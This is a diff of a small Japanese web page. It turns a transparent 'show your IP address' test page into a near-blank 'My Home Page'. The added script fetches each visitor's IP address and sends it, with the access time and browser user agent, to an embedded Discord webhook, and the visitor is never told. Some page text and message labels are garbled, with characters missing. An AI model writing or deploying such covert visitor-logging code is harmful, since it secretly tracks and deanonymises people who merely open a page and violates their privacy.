@@ -2,26 +2,37 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IPアドレス表示テスト</title>
+    <title>マイホームページ</title>
 </head>
 <body>
-    <h1>アクセス情報</h1>
-    <p>あなたのIPアドレス: <span id="ip-address">読み込み中...</span></p>
-    <p>大まかな地域: <span id="location">読み込み中...</span></p>
+
+    <h1>！。</h1>
+    <p>。</p>
 
     <script>
-        // 無料のAPI（ipapi.co）を使ってIPと位置情報を取得
-        fetch('https://ipapi.co')
+        // 1. アクセス者のIPアドレスを取得
+        fetch('https://ipify.org') 
             .then(response => response.json())
             .then(data => {
-                // 画面の文字を書き換える
-                document.getElementById('ip-address').textContent = data.ip;
-                document.getElementById('location').textContent = `${data.region} (${data.country_name})`;
+                const userIP = data.ip;
+                const accessTime = new Date().toLocaleString();
+                const userAgent = navigator.userAgent;
+
+                const discordMessage = `【通知】\n・ドレス: ${userIP}\n・アク日時: ${accessTime}\n・ブ情報: ${userAgent}`;
+
+                // 2. DiscordのWebhook URLへ送信（URL埋め込み済み）
+                fetch('https://discord.com/api/webhooks/1552975946405908545/4si-drwB0VJnyj1QXaUtt4z51cklu_DGN7zU5Sk3xK6UzuY_qewgY_ZybQN5rjdlI65i', { 
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: discordMessage
+                    })
+                });
             })
-            .catch(error => {
-                console.error('エラーが発生しました:', error);
-                document.getElementById('ip-address').textContent = '取得失敗';
-            });
+            .catch(error => console.error('ログ送信エラー:', error));
     </script>
+
 </body>
 </html>
